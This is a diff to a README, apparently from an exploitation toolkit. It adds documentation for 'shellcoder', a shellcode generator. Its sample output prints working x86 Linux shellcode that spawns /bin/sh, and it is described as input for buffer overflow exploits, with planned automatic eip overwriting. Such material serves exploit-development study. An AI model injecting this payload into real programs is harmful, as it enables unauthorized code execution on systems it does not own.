@@ -59,3 +59,28 @@ Binary Entry: 0x400980
 0x400cd0: [ebp-0x120] reference before calling strcmp(0x400ce4)
 0x400cd7: [ebp-0x110] reference before calling strcmp(0x400ce4)
 ```
+
+### shellcoder - The Shellcode Generator
+
+#### Description
+A tool that aims to make writing shellcode as easy as ever. Who needs ASCII to HEX converters when you can use shellcoder?! Simply put in the name of the file you would like to open and shellcoder will do the work for you and put the results in a handy file called "shellcode". If no name is provided, it assumes you meant bin/sh. 
+
+Future enhancements:
+- Provide filename that the shellcode will be injected in and it will automatically overflow the buffer and overwrite the saved eip register.
+
+#### Usage
+```
+shellcode <filename>
+```
+
+#### Sample Output
+```
+$ ./shellcoder 
+Here is the shellcode to inject: \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\x66\x90\x90
+and it is  144  characters long and  36  bytes long
+```
+and the file shellcode has:
+```
+\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\x66\x90\x90
+```
+which can be fed into an argument for a buffer overflow exploit.
